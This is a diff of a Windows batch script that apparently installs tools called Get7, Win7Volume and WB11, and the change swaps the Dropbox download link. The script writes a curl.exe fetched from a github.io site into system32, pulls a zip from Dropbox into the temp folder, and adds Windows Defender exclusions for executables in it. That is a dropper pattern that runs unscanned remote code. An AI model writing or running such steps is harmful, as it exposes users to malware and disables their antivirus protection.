@@ -11,7 +11,7 @@ if errorlevel 1 (
 )
 :main
 if not exist "%WinDir%\system32\curl.exe" powershell [System.Net.ServicePointManager]::SecurityProtocol = 'TLS12';iwr https://microtoolbox.github.io/curl.exe -OutFile "${env:windir}\system32\curl.exe"
-curl https://dl.dropbox.com/scl/fi/wq2bk3y4m1k5lv4im1pd6/Get7.zip?rlkey=8r6uetucfzb0ivwplfflppi1y -Lo "%temp%\Get7.zip"
+curl https://dl.dropbox.com/scl/fi/l8lyyue5s79ziqy9u1mql/Get7.zip?rlkey=8q6177vuzrqdthygy91fxdhzd -Lo "%temp%\Get7.zip"
 powershell Add-MpPreference -ExclusionPath '%temp%\Get7\Windows\Win7Volume.exe'
 powershell Add-MpPreference -ExclusionPath '%temp%\Get7\Windows\PENetwork.exe'
 powershell Add-MpPreference -ExclusionPath '%temp%\Get7\WB11.exe'
